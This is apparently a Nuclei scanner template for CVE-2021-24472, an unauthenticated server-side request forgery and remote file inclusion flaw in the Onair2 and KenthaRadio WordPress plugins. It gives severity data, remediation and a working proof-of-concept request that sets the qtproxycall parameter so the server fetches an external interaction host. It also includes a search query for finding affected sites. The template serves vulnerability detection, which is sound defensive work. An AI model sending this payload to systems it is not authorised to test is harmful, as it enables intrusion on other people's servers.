id: CVE-2021-24472

info:
  name: Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Remote File Inclusion/Server-Side Request Forgery
  author: Suman_Kar
  severity: critical
  description: |
    Onair2 < 3.9.9.2 and KenthaRadio < 2.0.2  have exposed proxy functionality to unauthenticated users. Sending requests to this proxy functionality will have the web server fetch and display the content from any URI, allowing remote file inclusion and server-side request forgery.
  remediation: |
    Update Onair2 to version 3.9.9.2 or higher and KenthaRadio to version 2.0.2 or higher to mitigate the vulnerability.
  reference:
    - https://wpscan.com/vulnerability/17591ac5-88fa-4cae-a61a-4dcf5dc0b72a
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24472
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-24472
    cwe-id: CWE-918
    epss-score: 0.0292
    epss-percentile: 0.8972
    cpe: cpe:2.3:a:qantumthemes:kentharadio:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: qantumthemes
    product: kentharadio
    framework: wordpress
    publicwww-query: "/wp-content/plugins/qt-kentharadio"
  tags: wordpress,lfi,ssrf,wp,wp-plugin,wpscan,cve,cve2021

http:
  - method: GET
    path:
      - '{{BaseURL}}/wp1/home-18/?qtproxycall=https://oast.me'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<h1> Interactsh Server </h1>"

      - type: status
        status:
          - 200

# digest: 490a0046304402205edeb22ec8f9d9e230094c21b42e22654dd3979de0c39d3f8ad71a43c2f0079a02201e2b67eca649cc2c1edc23d395d21d7aaee2a0f5900c410e9a23a9360cfb2f29:922c64590222798bb761d5b6d8e72950
